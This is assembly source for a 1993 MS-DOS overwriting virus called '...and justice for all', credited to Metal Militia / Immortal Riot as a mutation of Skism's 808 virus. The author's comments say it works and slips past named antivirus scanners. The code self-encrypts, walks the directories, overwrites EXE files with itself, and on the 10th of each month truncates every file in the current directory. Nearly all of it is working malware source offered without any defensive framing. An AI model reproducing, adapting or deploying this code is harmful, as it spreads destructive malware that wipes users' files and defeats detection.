; Virusname: ...and justice for all
; Country  : Sweden
; Author   : Metal Militia / Immortal Riot
; Date     : 07-29-1993
 
; This is an mutation of 808 virus by Skism in USA.
; Many thanks to the scratch coder of the 808 virus.
 
; We've tried this virus ourself, and it works just fine.
; Infects one random EXE-file every run, by overwriting it
; with the virus-code, and if the file is smaller, will "pad"
; it out to the size of the virus anyhow.
;
; McAfee Scan v105 can't find it, and
; S&S Toolkit 6.5 don't find it either.
 
; I haven't tried with scanners like Fprot/Tbscan,
; but they will probably report some virus structure.
;
; Best Regards : [Metal Militia]
;               [The Unforgiven]
 
 
filename   EQU      30                 ;used to find file name
fileattr   EQU      21                 ;used to find file attributes
filedate   EQU      24                 ;used to find file date
filetime   EQU      22                 ;used to find file time
 
 
 
code_start EQU      0100h              ;start of all .COM files
virus_size EQU      808                ;TR 808
 
 
code     segment  'code'
assume   cs:code,ds:code,es:code
         org      code_start
 
main proc   near
 
jmp    virus_start
 
encrypt_val    db     00h
 
virus_start:
 
     call     encrypt                  ;encrypt/decrypt file
     jmp      virus                    ;go to start of code
 
encrypt:
 
     push     ax
     mov      bx,offset virus_code     ;start encryption at data
 
xor_loop:
 
     mov      ch,[bx]                  ;read current byte
     xor      cl,encrypt_val           ;get encryption key
     mov      [bx],ch                  ;switch bytes
     inc      bx                       ;move bx up a byte
     cmp      bx,offset virus_code+virus_size
                                       ;are we done with the encryption
     jle      xor_loop                 ;no?  keep going
     pop      cx
     ret
 
 
infectfile:
 
     mov     dx,code_start             ;where virus starts in memory
     mov     bx,handle                 ;load bx with handle
     push    bx                        ;save handle on stack
     call    encrypt                   ;encrypt file
     pop     bx                        ;get back bx
     mov     cx,virus_size             ;number of bytes to write
     mov     ah,40h                    ;write to file
     int     21h                       ;
     push    bx
     call    encrypt                   ;fix up the mess
     pop     bx
     ret
 
virus_code:
 
wildcards    db     "*",0              ;search for directory argument
filespec     db     "*.EXE",0          ;search for EXE file argument
filespec2    db     "*.*",0            ;search fro all files argument
rootdir      db     "\",0              ;argument for root directory
dirdata      db     43 dup (?)         ;holds directory DTA
filedata     db     43 dup (?)         ;holds files DTA
diskdtaseg   dw     ?                  ;holds disk dta segment
diskdtaofs   dw     ?                  ;holds disk dta offset
tempofs      dw     ?                  ;holds offset
tempseg      dw     ?                  ;holds segment
drivecode    db     ?                  ;holds drive code
currentdir   db     64 dup (?)         ;save current directory into this
handle       dw     ?                  ;holds file handle
orig_time    dw     ?                  ;holds file time
orig_date    dw     ?                  ;holds file date
orig_attr    dw     ?                  ;holds file attr
idbuffer     dw     2 dup  (?)         ;holds virus id
 
virus:
 
      mov    ax,3000h                  ;get dos version
      int    21h                       ;
      cmp    al,02h                    ;is it at least 2.00?
      jb     bus1                      ;won't infect less than 2.00
      mov    ah,2ch                    ;get time
      int    21h                       ;
      mov    encrypt_val,dl            ;save m_seconds to encrypt val so
                                       ;theres 100 mutations possible
setdta:
 
     mov     dx,offset dirdata         ;offset of where to hold new dta
     mov     ah,1ah                    ;set dta address
     int     21h                       ;
 
newdir:
 
     mov     ah,19h                    ;get drive code
     int     21h                       ;
     mov     dl,al                     ;save drivecode
     inc     dl                        ;add one to dl, because functions differ
     mov     ah,47h                    ;get current directory
     mov     si, offset currentdir     ;buffer to save directory in
     int     21h                       ;
 
     mov     dx,offset rootdir         ;move dx to change to root directory
     mov     ah,3bh                    ;change directory to root
     int     21h                       ;
 
scandirs:
 
     mov     cx,13h                    ;include hidden/ro directorys
     mov     dx, offset wildcards      ;look for '*'
     mov     ah,4eh                    ;find first file
     int     21h                       ;
     cmp     ax,12h                    ;no first file?
     jne     dirloop                   ;no dirs found? bail out
 
bus1:
 
      jmp    bus
 
dirloop:
 
     mov     ah,4fh                    ;find next file
     int     21h                       ;
     cmp     ax,12h
     je      bus                       ;no more dirs found, roll out
 
chdir:
 
     mov     dx,offset dirdata+filename;point dx to fcb - filename
     mov     ah,3bh                    ;change directory
     int     21h                       ;
 
     mov     ah,2fh                    ;get current dta address
     int     21h                       ;
     mov     [diskdtaseg],es           ;save old segment
     mov     [diskdtaofs],bx           ;save old offset
     mov     dx,offset filedata        ;offset of where to hold new dta
     mov     ah,1ah                    ;set dta address
     int     21h                       ;
 
scandir:
 
     mov     cx,07h                    ;find any attribute
     mov     dx,offset filespec        ;point dx to "*.COM",0
     mov     ah,4eh                    ;find first file function
     int     21h                       ;
     cmp     ax,12h                    ;was file found?
     jne     transform
 
nextexe:
 
     mov     ah,4fh                    ;find next file
     int     21h                       ;
     cmp     ax,12h                    ;none found
     jne     transform                 ;found see what we can do
 
     mov     dx,offset rootdir         ;move dx to change to root directory
     mov     ah,3bh                    ;change directory to root
     int     21h                       ;
     mov     ah,1ah                    ;set dta address
     mov     ds,[diskdtaseg]           ;restore old segment
     mov     dx,[diskdtaofs]           ;restore old offset
     int     21h                       ;
     jmp     dirloop
 
 
bus:
 
     jmp     rollout
 
transform:
 
     mov     ah,2fh                    ;temporally store dta
     int     21h                       ;
     mov     [tempseg],es              ;save old segment
     mov     [tempofs],bx              ;save old offset
     mov     dx, offset filedata + filename
 
     mov     bx,offset filedata               ;save file...
     mov     ax,[bx]+filedate          ;date
     mov     orig_date,ax              ;
     mov     ax,[bx]+filetime          ;time
     mov     orig_time,ax              ;    and
     mov     ax,[bx]+fileattr          ;
     mov     ax,4300h
     int     21h
     mov     orig_attr,cx
     mov     ax,4301h                  ;change attributes
     xor     cx,cx                     ;clear attributes
     int     21h                       ;
     mov     ax,3d00h                  ;open file - read
     int     21h                       ;
     jc      fixup                     ;error - find another file
     mov     handle,ax                 ;save handle
     mov     ah,3fh                    ;read from file
     mov     bx,handle                 ;move handle to bx
     mov     cx,02h                    ;read 2 bytes
     mov     dx,offset idbuffer        ;save to buffer
     int     21h                       ;
 
     mov     ah,3eh                    ;close file for now
     mov     bx,handle                 ;load bx with handle
     int     21h                       ;
 
     mov     bx, idbuffer              ;fill bx with id string
     cmp     bx,02ebh                  ;infected?
     jne     doit                      ;same - find another file
 
 
fixup:
     mov     ah,1ah                    ;set dta address
     mov     ds,[tempseg]              ;restore old segment
     mov     dx,[tempofs]              ;restore old offset
     int     21h                       ;
     jmp     nextexe
 
 
doit:
 
     mov     dx, offset filedata + filename
     mov     ax,3d02h                  ;open file read/write access
     int     21h                       ;
     mov     handle,ax                 ;save handle
 
     call    infectfile
 
     ;mov     ax,3eh                    ;close file
     ;int     21h
 
rollout:
 
     mov     ax,5701h                  ;restore original
     mov     bx,handle                 ;
     mov     cx,orig_time              ;time and
     mov     dx,orig_date              ;date
     int     21h                       ;
 
     mov     ax,4301h                  ;restore original attributes
     mov     cx,orig_attr
     mov     dx,offset filedata + filename
     int     21h
     ;mov     bx,handle
     ;mov     ax,3eh                   ;close file
     ;int     21h
     mov     ah,3bh                    ;try to fix this
     mov     dx,offset rootdir         ;for speed
     int     21h                       ;
     mov     ah,3bh                    ;change directory
     mov     dx,offset currentdir      ;back to original
     int     21h                       ;
     mov     ah,2ah                    ;check system date
     int     21h                       ;
     cmp     cx,1993                   ;is it at least 1993?
     jb      audi                      ;no? don't do it now
     cmp     dl,10                     ;is it the 10th?
     jne     audi                      ;not yet? quit
     mov     dx,offset dirdata         ;offset of where to hold new dta
     mov     ah,1ah                    ;set dta address
     int     21h                       ;
     mov     ah,4eh                    ;find first file
     mov     cx,7h                     ;
     mov     dx,offset filespec2       ;offset *.*
 
Loops:
 
     int     21h                       ;
     jc      audi                      ;error? then quit
     mov     ax,4301h                  ;find all normal files
     xor     cx,cx                     ;
     int     21h                       ;
     mov     dx,offset dirdata + filename
     mov     ah,3ch                    ;fuck up all files in current dir
     int     21h                       ;
     jc      audi                      ;error? quit
     mov     ah,4fh                    ;find next file
     jmp     loops                     ;
 
audi:
 
     mov     ax,4c00h                  ;end program
     int     21h                       ;
 
; Time changes, and so does the text..sorry Skism :)
; but hey! Isn't this message much fanicer then the old ?
; Yeah, right, Metal Up Your Ass!
 
words_  db " Metal Militia / Immortal Riot",0
 
words2  db " ...and Justice for all",0
 
words3   db  " Justice is lost",0
         db  " Justice is raped",0
         db  " Justice is gone",0
         db  " Pulling your strings",0
         db  " Seeking no truth",0
         db  " Winning is all",0
  db  " Find it so Grim",0
  db  " so true",0
  db  " so real",0
 
; heh..what a lucky dog I'm, the new virus turned out to be 808 bytes,
; which means exactly like the old one..(used tlink2 /t).
 
main     endp
code     ends
         end      main
 
 
 